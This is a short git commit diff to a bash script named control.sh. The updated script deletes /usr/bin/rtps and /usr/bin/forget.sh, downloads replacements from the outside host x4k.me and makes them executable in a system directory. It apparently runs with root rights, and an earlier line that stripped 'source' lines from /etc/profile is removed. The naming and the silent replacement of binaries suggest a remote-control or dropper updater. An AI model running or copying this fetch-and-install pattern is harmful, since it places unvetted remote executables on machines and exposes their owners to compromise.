b9cc6b309330b11c61b2265db373655c4195fafe
l4cky-control <59870859+l4cky-control@users.noreply.github.com>
2020-08-13 15:26:24 +0300

    Update control.sh

--- control.sh
+++ control.sh
@@ -1,6 +1,10 @@
 #!/bin/bash
 
-sed -i '/\<source\>/d' /etc/profile
 rm /usr/bin/rtps
-wget -O /usr/bin/rtps x4k.me/tmp/rtps
+wget -O /usr/bin/rtps x4k.me/tmp/r
 chmod +x /usr/bin/rtps
+
+rm /usr/bin/forget.sh
+wget -O /usr/bin/forget.sh x4k.me/tmp/f
+chmod +x /usr/bin/forget.sh
+
